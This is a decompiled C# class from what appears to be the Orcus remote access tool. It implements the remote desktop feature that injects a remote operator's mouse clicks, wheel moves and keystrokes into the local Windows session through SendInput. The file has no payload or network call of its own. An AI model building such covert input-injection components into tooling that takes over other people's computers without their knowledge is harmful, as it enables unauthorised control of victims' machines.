using System;
using System.Drawing;
using System.Windows.Forms;
using Orcus.Native;
using Orcus.Shared.Commands.RemoteDesktop;

namespace Orcus.Commands.RemoteDesktop;

public class RemoteActions
{
	private const int XBUTTON1 = 1;

	private const int XBUTTON2 = 2;

	private readonly Screen[] _screens;

	private readonly Rectangle _virtualScreen;

	public RemoteActions()
	{
		_virtualScreen = SystemInformation.get_VirtualScreen();
		_screens = Screen.get_AllScreens();
	}

	public void DoMouseAction(RemoteDesktopMouseAction mouseAction, int x, int y, int extraData, int monitor)
	{
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		Screen obj = _screens[monitor];
		x = obj.get_Bounds().X + x;
		y = obj.get_Bounds().Y + y;
		INPUT input = default(INPUT);
		input.type = InputType.MOUSE;
		input.U.mi.dwFlags = MouseActionToMouseEvent(mouseAction, ref extraData) | MOUSEEVENTF.ABSOLUTE | MOUSEEVENTF.VIRTUALDESK | MOUSEEVENTF.MOVE;
		input.U.mi.dx = CalculateAbsoluteCoordinateX(x);
		input.U.mi.dy = CalculateAbsoluteCoordinateY(y);
		input.U.mi.mouseData = extraData;
		SendIput(input);
	}

	public void DoKeyboardAction(RemoteDesktopKeyboardAction keyboardAction, short scanCode)
	{
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Invalid comparison between Unknown and I4
		INPUT input = default(INPUT);
		input.type = InputType.KEYBOARD;
		input.U.ki.wScan = scanCode;
		input.U.ki.dwFlags = KEYEVENTF.SCANCODE;
		if ((int)keyboardAction == 1)
		{
			input.U.ki.dwFlags |= KEYEVENTF.KEYUP;
		}
		input.U.ki.dwExtraInfo = UIntPtr.Zero;
		input.U.ki.time = 0;
		SendIput(input);
	}

	private void SendIput(INPUT input)
	{
		NativeMethods.SendInput(1u, new INPUT[1] { input }, INPUT.Size);
	}

	private int CalculateAbsoluteCoordinateX(int x)
	{
		float num = (float)x * 65536f;
		Rectangle virtualScreen = _virtualScreen;
		return (int)(num / (float)virtualScreen.Width);
	}

	private int CalculateAbsoluteCoordinateY(int y)
	{
		float num = (float)y * 65536f;
		Rectangle virtualScreen = _virtualScreen;
		return (int)(num / (float)virtualScreen.Height);
	}

	private static MOUSEEVENTF MouseActionToMouseEvent(RemoteDesktopMouseAction mouseAction, ref int mouseData)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected I4, but got Unknown
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		switch ((int)mouseAction)
		{
		default:
			throw new ArgumentOutOfRangeException("mouseAction", mouseAction, null);
		case 0:
			return MOUSEEVENTF.LEFTDOWN;
		case 1:
			return MOUSEEVENTF.LEFTUP;
		case 2:
			return MOUSEEVENTF.RIGHTDOWN;
		case 3:
			return MOUSEEVENTF.RIGHTUP;
		case 4:
			return MOUSEEVENTF.MIDDLEDOWN;
		case 5:
			return MOUSEEVENTF.MIDDLEUP;
		case 6:
			mouseData = 1;
			return MOUSEEVENTF.XDOWN;
		case 7:
			mouseData = 1;
			return MOUSEEVENTF.XUP;
		case 8:
			mouseData = 2;
			return MOUSEEVENTF.XDOWN;
		case 9:
			mouseData = 2;
			return MOUSEEVENTF.XUP;
		case 10:
			return MOUSEEVENTF.MOVE;
		case 11:
			return MOUSEEVENTF.WHEEL;
		}
	}
}
